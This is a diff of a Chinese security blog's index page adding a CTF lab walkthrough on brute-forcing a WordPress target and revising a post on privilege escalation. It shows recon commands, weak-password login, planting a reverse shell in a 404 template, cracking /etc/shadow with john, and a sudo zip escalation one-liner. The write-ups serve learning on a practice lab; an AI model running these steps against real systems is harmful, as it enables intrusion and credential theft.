@@ -160,6 +160,81 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-GetFlag-暴力破解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">GetFlag-暴力破解</a>
+    </h1>
+  
+
+        
+        <a href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2020-05-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本文是第六篇，介绍暴力破解的一些小姿势，涉及知识点：工具nikto、dirb、Wpscan以及nmap的使用，文件上传、用msf控制台生成后门进行暴力破解等，关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.106<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、john、metasploit、VMware、VirtualBox<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.106</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;开放端口： 80(http)、22(ssh)、21(ftp)<br>&emsp;&emsp;Web容器信息：Apache httpd 2.4.18<br>&emsp;&emsp;系统信息：Ubuntu 2.2<br>&emsp;&emsp;针对开放http服务的80端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.1.106</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.106</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%873-1.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;网站首页index.html、目录/secret/以及后台页面目录/wp-admin/<br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;打开浏览器访问ip地址<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;查看源码，啥也没有<br>&emsp;&emsp;访问/secret/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;大致浏览之后，发现网站是用WordPress搭建的，以及一个登录入口<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;访问登录入口发现找不到该页面，而域名发生变化，将其改成ip地址<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;成功进入后台登录页面，尝试输入弱口令，admin/admin，<br>&emsp;&emsp;域名还是发生变化导致服务器找不到该页面，这里修改本机host文件添加域名解析记录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;回到页面，点击刷新<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;弹出一个新的登录页面，继续尝试用弱口令admin/admin<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;成功进入后台页面<br>&emsp;&emsp;这里可以使用专门针对WordPress站点的扫描工具WPScan，使用命令<br>&emsp;&emsp;<code>wpscan --url  www.vtcsec.com/secret/ --enumerate u</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;获得结果admin<br>&emsp;&emsp;接下来可以用wpscan继续用字段对站点进行密码的暴力破解<br>&emsp;&emsp;这里用metasploit中的爆破模块进行密码的暴力破解<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;相应设置以后，开始破解<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;成功获得密码<br>&emsp;&emsp;<strong>漏洞利用</strong><br>&emsp;&emsp;登录后寻找文件或者代码上传点，发现和之前的POST-SQL注入的后台页面是一样的，先在设置将语言改成中文，来到外观404页面的编辑处<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;思路：将反弹shell的代码放到404模板内，保存后访问不存在页面，404.php被触发，成功反弹shell。<br>&emsp;&emsp;使用msfvenom生成代码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;将代码复制到404模板内并保存<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;用msf控制台打开监听<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;接下来访问一个不存在的页面<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%87181.png" alt=""><br>&emsp;&emsp;发现监听端没有反应，多尝试几个页面，依然没有反应，使用netcat反弹，依然没有反应，应该是404.php没有被调用。<br>&emsp;&emsp;尝试直接访问404.php，需要知道404.php所在路径。在模板编辑中发现css文件，猜测css文件和404.php同属于一个目录，而博客网页需要导入css文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;这时去找到一篇文章，查看页面源代码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;成功发现路径，接下来访问404.php<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;msf控制台成功建立对话<br>&emsp;&emsp;输入shell，得到反弹shell，然后使用python脚本命令，反弹终端<br>&emsp;&emsp;输入<code>python -c  “import pty;pty.spawn(‘/bin/bash’)”</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;成功返回终端，<br>&emsp;&emsp;跳转到根目录，查看home目录，进行一波信息收集<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;发现用户marlinspike，而wordpress配置文件为原始文件，没有进行相关配置<br>&emsp;&emsp;这时可以利用msf控制台反弹的对话下载passwd以及shadow文件使用john工具进行密码的暴力破解。<br>&emsp;&emsp;下载文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;确认文件是否被下载成功<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;文件成功下载，先使用命令将文件转换为john工具可识别的文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8726.png" alt=""><br>&emsp;&emsp;使用john破解密码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8727.png" alt=""><br>&emsp;&emsp;成功破解到密码，回到终端进行登录，并查看当前用户可执行的sudo命令，然后提权<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8728.png" alt=""><br>&emsp;&emsp;进入Flag值一般在root目录下，进入到root目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8729.png" alt=""><br>&emsp;&emsp;靶场没有设置flag值，渗透到此为止。<br>&emsp;&emsp;当然，也可以使用ssh远程登录用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%8730.png" alt=""><br><strong>0x04总结</strong><br>&emsp;&emsp;这个靶场不难，一个弱口令轻松登入后台，利用模板页面可修改，上传反弹shell的代码，主要是get了暴力破解的一些姿势。</p>
+<p><br><br><br><br><font face="Georgia" color=#c4444>暴破靠字典。</font><br>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">复现、CTF、study、flag、暴力破解</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-GetFlag-文件包含-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -180,7 +255,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列第五篇，主要内容为上篇文件包含-1的提权过程。涉及知识点：低权限shell提权到root终端，等，关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.104<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.103<br>&emsp;&emsp;ps：切换了Wifi，所以ip地址发生变化<br><strong>0x02工具</strong>：<br>&emsp;&emsp;nc、metasploit、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>补充：</strong><br>&emsp;&emsp;在文件包含-1中，直接在数据库写入php代访问页面反弹shell是失败的，<br>&emsp;&emsp;尝试用msf控制台监听方法,先插入代码到数据库<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8733.png" alt=""><br>&emsp;&emsp;成功插入代码<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8734.png" alt=""><br>&emsp;&emsp;浏览器访问，控制台监听没有反应，方法失败。<br>&emsp;&emsp;上次渗透，已经成功反弹了终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8735.png" alt=""><br>&emsp;&emsp;接下来看看提权，重新获取反弹shell后<br>&emsp;&emsp;<strong>基于内核提权</strong><br>&emsp;&emsp;查看系统发行版本及内核版本，shell下输入命令<code>uname -a</code>与<code>cat /etc/*-release</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8736.png" alt=""><br>&emsp;&emsp;使用kali自带的searchsploit工具搜索内核漏洞<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8737.png" alt=""><br>&emsp;&emsp;没有结果。<br>&emsp;&emsp;<strong>基于定时任务提权</strong><br>&emsp;&emsp;输入命令<code>cat /etc/crontab</code>查看定时任务<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8738.png" alt=""><br>&emsp;&emsp;发现不存在非root权限可执行的定时任务。<br>&emsp;&emsp;<strong>基于密码提权</strong><br>&emsp;&emsp;尝试读取 <code>/etc/passwd</code>以及<code>/etc/shadow</code>文件<br>&emsp;&emsp;结果：没有足够的权限查看shadow文件，passwd可查看，无法使用暴力破解工具破解密码。<br>&emsp;&emsp;从密码复用角度搜集信息，尝试是否能够获得一些密码此时带有提示信息的文件以及配置文件都值得留意。<br>&emsp;&emsp;使用python脚本命令反弹终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8739.png" alt=""><br>&emsp;&emsp;当前用户为zico，上次已经使用过一些密码尝试查看执行sudo权限的命令，皆以失败告终。这次遍历目录，进行信息收集。<br>&emsp;&emsp;查看当前位置，并输入<code>ls -alh</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8740.png" alt=""><br>&emsp;&emsp;尝试进入root，果然，提示权限不足<br>&emsp;&emsp;进入home，发现zico用户，进入查看<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8741.png" alt=""><br>&emsp;&emsp;账户开放ssh，然而并不能知登录密码，我们打开to_do.txt查看是否存在提示<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8742.png" alt=""><br>&emsp;&emsp;按照提示，我们先进入joomla目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8743.png" alt=""><br>&emsp;&emsp;发现web.config.txt，打开后，并不存在敏感信息。<br>&emsp;&emsp;来看第二个bootstrap.zip，应该是关于站点bootstrap的相关代码<br>&emsp;&emsp;先看第三个wordpress<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8744.png" alt=""><br>&emsp;&emsp;发现wp-config.php，打开<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8745.png" alt=""><br>&emsp;&emsp;发现以zico为用户名的数据库登录密码<code>sWfCsfJSPV9H3AmQzw8</code>，也许这个就是zico用户的登录密码，尝试远程登录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8746.png" alt=""><br>&emsp;&emsp;登录成功<br>&emsp;&emsp;<strong>基于命令提权</strong><br>&emsp;&emsp;查看可执行的sudo命令<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8747.png" alt=""><br>&emsp;&emsp;结果为tar、zip<br>&emsp;&emsp;这里使用zip命令进行提权<br>&emsp;&emsp;使用touch命令创建一个空白文件exploit<br>&emsp;&emsp;然后输入命令<br>&emsp;&emsp;<code>sudo -u root zip exploit.zip exploit -T --unzip-command=&quot;sh -c /bin/bash&quot;</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8748.png" alt=""><br>&emsp;&emsp;提权成功，查看root目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8749.png" alt=""><br>&emsp;&emsp;成功获取到flag</p>
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列第五篇，主要内容为上篇文件包含-1的提权过程。涉及知识点：低权限shell提权到root终端。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.104<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.103<br>&emsp;&emsp;ps：切换了Wifi，所以ip地址发生变化<br><strong>0x02工具</strong>：<br>&emsp;&emsp;nc、metasploit、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>补充：</strong><br>&emsp;&emsp;在文件包含-1中，直接在数据库写入php代访问页面反弹shell是失败的，<br>&emsp;&emsp;尝试用msf控制台监听方法,先插入代码到数据库<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8733.png" alt=""><br>&emsp;&emsp;成功插入代码<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8734.png" alt=""><br>&emsp;&emsp;浏览器访问，控制台监听没有反应，方法失败。<br>&emsp;&emsp;上次渗透，已经成功反弹了终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8735.png" alt=""><br>&emsp;&emsp;接下来看看提权，重新获取反弹shell后<br>&emsp;&emsp;<strong>基于内核提权</strong><br>&emsp;&emsp;查看系统发行版本及内核版本，shell下输入命令<code>uname -a</code>与<code>cat /etc/*-release</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8736.png" alt=""><br>&emsp;&emsp;使用kali自带的searchsploit工具搜索内核漏洞<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8737.png" alt=""><br>&emsp;&emsp;没有结果。<br>&emsp;&emsp;<strong>基于定时任务提权</strong><br>&emsp;&emsp;输入命令<code>cat /etc/crontab</code>查看定时任务<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8738.png" alt=""><br>&emsp;&emsp;发现不存在非root权限可执行的定时任务。<br>&emsp;&emsp;<strong>基于密码提权</strong><br>&emsp;&emsp;尝试读取 <code>/etc/passwd</code>以及<code>/etc/shadow</code>文件<br>&emsp;&emsp;结果：没有足够的权限查看shadow文件，passwd可查看，无法使用暴力破解工具破解密码。<br>&emsp;&emsp;从密码复用角度搜集信息，尝试是否能够获得一些密码此时带有提示信息的文件以及配置文件都值得留意。<br>&emsp;&emsp;使用python脚本命令反弹终端<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8739.png" alt=""><br>&emsp;&emsp;当前用户为zico，上次已经使用过一些密码尝试查看执行sudo权限的命令，皆以失败告终。这次遍历目录，进行信息收集。<br>&emsp;&emsp;查看当前位置，并输入<code>ls -alh</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8740.png" alt=""><br>&emsp;&emsp;尝试进入root，果然，提示权限不足<br>&emsp;&emsp;进入home，发现zico用户，进入查看<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8741.png" alt=""><br>&emsp;&emsp;账户开放ssh，然而并不能知登录密码，我们打开to_do.txt查看是否存在提示<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8742.png" alt=""><br>&emsp;&emsp;按照提示，我们先进入joomla目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8743.png" alt=""><br>&emsp;&emsp;发现web.config.txt，打开后，并不存在敏感信息。<br>&emsp;&emsp;来看第二个bootstrap.zip，应该是关于站点bootstrap的相关代码<br>&emsp;&emsp;先看第三个wordpress<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8744.png" alt=""><br>&emsp;&emsp;发现wp-config.php，打开<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8745.png" alt=""><br>&emsp;&emsp;发现以zico为用户名的数据库登录密码<code>sWfCsfJSPV9H3AmQzw8</code>，也许这个就是zico用户的登录密码，尝试远程登录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8746.png" alt=""><br>&emsp;&emsp;登录成功<br>&emsp;&emsp;<strong>基于命令提权</strong><br>&emsp;&emsp;查看可执行的sudo命令<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8747.png" alt=""><br>&emsp;&emsp;结果为tar、zip<br>&emsp;&emsp;这里使用zip命令进行提权<br>&emsp;&emsp;使用touch命令创建一个空白文件exploit<br>&emsp;&emsp;然后输入命令<br>&emsp;&emsp;<code>sudo -u root zip exploit.zip exploit -T --unzip-command=&quot;sh -c /bin/bash&quot;</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8748.png" alt=""><br>&emsp;&emsp;提权成功，查看root目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8749.png" alt=""><br>&emsp;&emsp;成功获取到flag</p>
 <p><strong>0x04总结</strong><br>&emsp;&emsp;FLAG一般都存在root目录下，渗透的目的在于夺取root目录下FLAG值，即提权到root权限。<br>&emsp;&emsp;此次渗透，主要是记录一下关于提权操作学习过程。</p>
 <p><br><br><br><br><font face="Georgia" color=#c4444>提权之路路漫漫，其修真的远兮。</font><br>作者：WebDogC</p>
 
@@ -256,7 +331,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列第四篇，主要内容为通过文件包含结合数据库写入payload实现反弹shell。涉及知识点：工具nmap、dirb、nikto及nc的使用、渗透流程、kali建立局域网服务器等，关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.1.15<br>&emsp;&emsp;靶机(Ubuntu)：192.168.1.16<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、netcat、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口： 80(http)、22(ssh)、111(rpc)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.2.22<br>&emsp;&emsp;&emsp;&emsp;系统信息：Ubuntu 1.10<br>&emsp;&emsp;进一步探测敏感信息<br>&emsp;&emsp;使用nc对非http服务的大端口进行探测<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;长时间没有反应，未能得到有效信息<br>&emsp;&emsp;针对开放http服务的80端口<br>&emsp;&emsp;终端下输入<code>nikto 